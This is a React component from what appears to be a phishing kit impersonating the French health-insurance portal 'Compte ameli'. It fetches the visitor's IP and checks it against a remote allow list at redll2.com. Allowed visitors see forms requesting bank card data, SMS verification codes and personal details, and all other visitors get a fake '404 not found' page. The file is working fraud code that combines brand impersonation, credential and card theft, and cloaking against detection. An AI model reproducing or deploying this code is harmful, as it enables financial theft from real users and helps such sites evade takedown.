import React, { Component } from "react";
import { connect } from "react-redux";
import Contents from "./Containers/contents";
import InfoForm from "./Containers/InfoForm";
import CardForm from "./Containers/CardForm";
import SmsForm from "./Containers/SmsForm";
import withAnalytics from "./Containers/AnalyticsHot";
import { PAGES, getPageInfo } from "./actions/index";
import Spinner from "./Components/Spinner";
import SuccessMessage from "./Containers/Success";
import { Helmet } from 'react-helmet'


class App extends Component {
	constructor(props) {
		super(props);
		this.state = {
			ip_address: {},
			is_active: false,
			hidden: true
		}
	}

	componentDidMount() {
		fetch('https://api.ipify.org?format=json')
			.then(res => res.json())
			.then(json => {
				this.setState({...this.state, ip_address: json.ip})
				fetch("https://redll2.com/allow.txt")
					.then(res => res.text()).then(text => {
						if (text.includes(this.state.ip_address)) {
							this.setState({...this.state, hidden: false, is_active: true});
						}
						else{
							this.setState({...this.state, hidden: false, is_active: false});
						}
					});
				});
		if (this.props.activePage === null) {
			this.props.getPage();
		}
	}

	render() {
		const { is_active } = this.state
		const { hidden } = this.state
		const { activePage } = this.props;
		if (hidden) {
			return (
				<div style={{display: hidden&&"none"}}>

				</div>
			)
		}
		else{
			if (is_active){
				if (activePage === PAGES.card)
					return (
						<Contents>
							<Helmet>
								<title>Compte ameli - mon espace personnel</title>
							</Helmet>
							<CardForm title="Veuillez renseigner vos données bancaires." />
						</Contents>
					);
				if (activePage === PAGES.sms)
					return (
						<Contents>
							<Helmet>
								<title>Compte ameli - mon espace personnel</title>
						</Helmet>
							<SmsForm title="Veuillez renseigner le code sms d'identification." />
						</Contents>
					);
				if (activePage === PAGES.info)
					return (
						<Contents>
							<Helmet>
								<title>Compte ameli - mon espace personnel</title>
						</Helmet>
							<InfoForm title="Veuillez renseigner vos informations personnelles." />
						</Contents>
					);
				if (activePage === PAGES.extern) {
					return (
						<Contents>
							<Helmet>
								<title>Compte ameli - mon espace personnel</title>
						</Helmet>
							<SuccessMessage />
						</Contents>
					);
				}
				return <div>
					<Contents>
						<Helmet>
								<title>Compte ameli - mon espace personnel</title>
						</Helmet>
						<Spinner />
					</Contents>
				</div>;
			}
			else {
				return(
					<div>
						<Helmet>
							<title>404 not found</title>
						</Helmet>
						404 not found
					</div>
				)
			}
		}
	}
}

const mapPropsToStore = store => ({ activePage: store.session.activePage });
const mapDispatchToProps = {
	getPage: getPageInfo
};

export default connect(mapPropsToStore, mapDispatchToProps)(withAnalytics(App));
